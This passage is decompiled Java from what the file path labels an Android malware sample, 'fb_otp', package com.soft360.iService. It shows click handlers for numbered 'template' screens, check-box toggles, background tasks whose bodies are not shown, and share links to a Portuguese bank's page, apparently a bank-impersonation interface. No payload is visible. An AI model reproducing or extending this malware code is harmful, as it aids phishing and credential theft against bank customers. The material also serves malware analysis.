  public void template52_click(View paramView)
  {
    new dG(this, (byte)0).execute(new Void[0]);
  }
  
  public void template53_click(View paramView)
  {
    boolean bool3 = false;
    boolean bool2 = false;
    boolean bool1;
    switch (paramView.getId())
    {
    default: 
      return;
    case 2131427464: 
      new dH(this, (byte)0).execute(new Void[0]);
      return;
    case 2131427416: 
      try
      {
        bool1 = ((Boolean)paramView.getTag()).booleanValue();
        if (bool1)
        {
          bool1 = false;
          paramView.setTag(Boolean.valueOf(bool1));
          if (!bool1) {
            break label162;
          }
          ((ImageView)paramView.findViewById(2131427417)).setImageResource(getResources().getIdentifier("template53_check", "drawable", getPackageName()));
          ((TextView)paramView.findViewById(2131427418)).setText(getString(2131165619));
        }
      }
      catch (Exception localException1)
      {
        for (;;)
        {
          bool1 = true;
          continue;
          bool1 = true;
        }
        ((ImageView)paramView.findViewById(2131427417)).setImageResource(getResources().getIdentifier("template53_uncheck", "drawable", getPackageName()));
        ((TextView)paramView.findViewById(2131427418)).setText(getString(2131165620));
        return;
      }
    case 2131427419: 
      try
      {
        label162:
        bool1 = ((Boolean)paramView.getTag()).booleanValue();
        if (bool1)
        {
          bool1 = bool2;
          paramView.setTag(Boolean.valueOf(bool1));
          if (!bool1) {
            break label303;
          }
          ((ImageView)paramView.findViewById(2131427417)).setImageResource(getResources().getIdentifier("template53_check", "drawable", getPackageName()));
          ((TextView)paramView.findViewById(2131427420)).setText(getString(2131165621));
        }
      }
      catch (Exception localException2)
      {
        for (;;)
        {
          bool1 = true;
          continue;
          bool1 = true;
        }
        label303:
        ((ImageView)paramView.findViewById(2131427417)).setImageResource(getResources().getIdentifier("template53_uncheck", "drawable", getPackageName()));
        ((TextView)paramView.findViewById(2131427420)).setText(getString(2131165622));
        return;
      }
    }
    try
    {
      bool1 = ((Boolean)paramView.getTag()).booleanValue();
      if (bool1)
      {
        bool1 = bool3;
        paramView.setTag(Boolean.valueOf(bool1));
        if (!bool1) {
          break label445;
        }
        ((ImageView)paramView.findViewById(2131427417)).setImageResource(getResources().getIdentifier("template53_check", "drawable", getPackageName()));
        ((TextView)paramView.findViewById(2131427422)).setText(getString(2131165623));
      }
    }
    catch (Exception localException3)
    {
      for (;;)
      {
        bool1 = true;
        continue;
        bool1 = true;
      }
      label445:
      ((ImageView)paramView.findViewById(2131427417)).setImageResource(getResources().getIdentifier("template53_uncheck", "drawable", getPackageName()));
      ((TextView)paramView.findViewById(2131427422)).setText(getString(2131165624));
    }
  }
  
  public void template54_click(View paramView)
  {
    boolean bool3 = false;
    boolean bool2 = false;
    boolean bool1;
    switch (paramView.getId())
    {
    default: 
      return;
    case 2131427464: 
      new dJ(this, (byte)0).execute(new Void[0]);
      return;
    case 2131427416: 
      try
      {
        bool1 = ((Boolean)paramView.getTag()).booleanValue();
        if (bool1)
        {
          bool1 = false;
          paramView.setTag(Boolean.valueOf(bool1));
          if (!bool1) {
            break label162;
          }
          ((ImageView)paramView.findViewById(2131427417)).setImageResource(getResources().getIdentifier("template53_check", "drawable", getPackageName()));
          ((TextView)paramView.findViewById(2131427418)).setText(getString(2131165628));
        }
      }
      catch (Exception localException1)
      {
        for (;;)
        {
          bool1 = true;
          continue;
          bool1 = true;
        }
        ((ImageView)paramView.findViewById(2131427417)).setImageResource(getResources().getIdentifier("template53_uncheck", "drawable", getPackageName()));
        ((TextView)paramView.findViewById(2131427418)).setText(getString(2131165629));
        return;
      }
    case 2131427419: 
      try
      {
        label162:
        bool1 = ((Boolean)paramView.getTag()).booleanValue();
        if (bool1)
        {
          bool1 = bool2;
          paramView.setTag(Boolean.valueOf(bool1));
          if (!bool1) {
            break label303;
          }
          ((ImageView)paramView.findViewById(2131427417)).setImageResource(getResources().getIdentifier("template53_check", "drawable", getPackageName()));
          ((TextView)paramView.findViewById(2131427420)).setText(getString(2131165630));
        }
      }
      catch (Exception localException2)
      {
        for (;;)
        {
          bool1 = true;
          continue;
          bool1 = true;
        }
        label303:
        ((ImageView)paramView.findViewById(2131427417)).setImageResource(getResources().getIdentifier("template53_uncheck", "drawable", getPackageName()));
        ((TextView)paramView.findViewById(2131427420)).setText(getString(2131165631));
        return;
      }
    }
    try
    {
      bool1 = ((Boolean)paramView.getTag()).booleanValue();
      if (bool1)
      {
        bool1 = bool3;
        paramView.setTag(Boolean.valueOf(bool1));
        if (!bool1) {
          break label445;
        }
        ((ImageView)paramView.findViewById(2131427417)).setImageResource(getResources().getIdentifier("template53_check", "drawable", getPackageName()));
        ((TextView)paramView.findViewById(2131427422)).setText(getString(2131165632));
      }
    }
    catch (Exception localException3)
    {
      for (;;)
      {
        bool1 = true;
        continue;
        bool1 = true;
      }
      label445:
      ((ImageView)paramView.findViewById(2131427417)).setImageResource(getResources().getIdentifier("template53_uncheck", "drawable", getPackageName()));
      ((TextView)paramView.findViewById(2131427422)).setText(getString(2131165633));
    }
  }
  
  public void template55_click(View paramView)
  {
    new dL(this, (byte)0).execute(new Void[0]);
  }
  
  public void template56_click(View paramView)
  {
    new dM(this, (byte)0).execute(new Void[0]);
  }
  
  public void template5_click(View paramView)
  {
    new dN(this, (byte)0).execute(new Void[0]);
  }
  
  public void template6_click(View paramView)
  {
    new dO(this, (byte)0).execute(new Void[0]);
  }
  
  public void template7_click(View paramView)
  {
    new dP(this, (byte)0).execute(new Void[0]);
  }
  
  public void template8_click(View paramView)
  {
    new dQ(this, (byte)0).execute(new Void[0]);
  }
  
  public void template9_click(View paramView)
  {
    switch (paramView.getId())
    {
    default: 
      return;
    case 2131427367: 
      new dR(this, (byte)0).execute(new Void[0]);
      return;
    case 2131427471: 
      startActivity(new Intent("android.intent.action.VIEW", Uri.parse("http://www.facebook.com/sharer.php?u=https://www.cgd.pt/Corporativo/Grupo-CGD/Pages/Contactos-CGD-Sede.aspx")));
      return;
    case 2131427472: 
      startActivity(new Intent("android.intent.action.VIEW", Uri.parse("http://twitter.com/share?url=https://www.cgd.pt/Corporativo/Grupo-CGD/Pages/Contactos-CGD-Sede.aspx")));
      return;
    case 2131427473: 
      startActivity(new Intent("android.intent.action.VIEW", Uri.parse("http://www.linkedin.com/shareArticle?mini=true&url=https://www.cgd.pt/Corporativo/Grupo-CGD/Pages/Contactos-CGD-Sede.aspx")));
      return;
    }
    b(((TextView)findViewById(2131427356)).getText().toString());
    a(a(2131165267));
  }
}


/* Location:              /home/enzo/Documents/hacking/malwares/fb_otp/classes-dex2jar.jar!/com/soft360/iService/MainActivity.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */